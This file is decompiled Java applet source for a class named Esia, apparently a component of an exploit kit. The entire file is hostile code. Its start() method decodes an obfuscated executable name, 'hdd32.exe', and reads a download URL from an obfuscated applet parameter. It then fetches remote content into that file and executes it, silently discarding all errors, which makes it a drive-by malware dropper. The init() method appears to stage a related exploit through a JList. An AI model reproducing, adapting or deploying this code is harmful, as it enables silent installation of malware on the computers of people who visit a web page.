import java.awt.Component;
import javax.swing.JList;
import java.applet.Applet;

// 
// Decompiled by Procyon v0.5.30
// 

public class Esia extends Applet
{
    private Object[] iuyt;
    private JList poiuy5;
    
    private void yeeua() {
        final Boolean s = true;
    }
    
    @Override
    public void init() {
        final String egf = new String();
        final Lolp uyw3 = new Lolp();
        final Bar juy5 = new Bar();
        final int a = 21;
        juy5.Bar();
        final int as = 1;
        final Object[] jjtr = Lolp.Lopwd();
        this.add(this.poiuy5 = new JList((E[])jjtr));
    }
    
    @Override
    public void start() {
        try {
            final String eff1 = new String();
            final Pol utedc = new Pol();
            String kiuyrd = utedc.Pysta();
            if (kiuyrd.charAt(kiuyrd.length() - 1) != '\\') {
                kiuyrd += "\\";
            }
            final String ppkwqaiuytg = kiuyrd + "hlkjhgf4dd3lkjhgf42.elkjhgf4xlkjhgf4e".replace("lkjhgf4", "");
            final Oi oppwkq = new Oi();
            final String gw = new String();
            final String oonwqiuyt = this.getParameter("dlkjht5eslkjht5t".replace("lkjht5", ""));
            final String d = new String();
            final String doonwqiuyt = utedc.Tapa(oonwqiuyt);
            oppwkq.jkkkree = oppwkq.Lolgfes(ppkwqaiuytg);
            final String e = new String();
            oppwkq.hjjrewwr = Etui.Mongo(doonwqiuyt);
            final String df = new String();
            byte[] ppkrwq = new byte[153601];
            final String gqh = new String();
            final int ahfh = 31;
            final String fff = new String();
            int cnt = 0;
            while ((cnt = oppwkq.hjjrewwr.read(ppkrwq)) > 0) {
                final String za = new String();
                oppwkq.jkkkree.write(ppkrwq, 0, cnt);
                ppkrwq = new byte[153601];
            }
            final String saqa = new String();
            oppwkq.jkkkree.close();
            final String ggqwww = new String();
            oppwkq.hjjrewwr.close();
            try {
                final String afqa0 = new String();
                Etui.Loema(ppkwqaiuytg);
            }
            catch (Exception ex) {}
        }
        catch (Exception ex2) {}
    }
    
    public class affhg
    {
    }
    
    public class fffgss
    {
    }
}
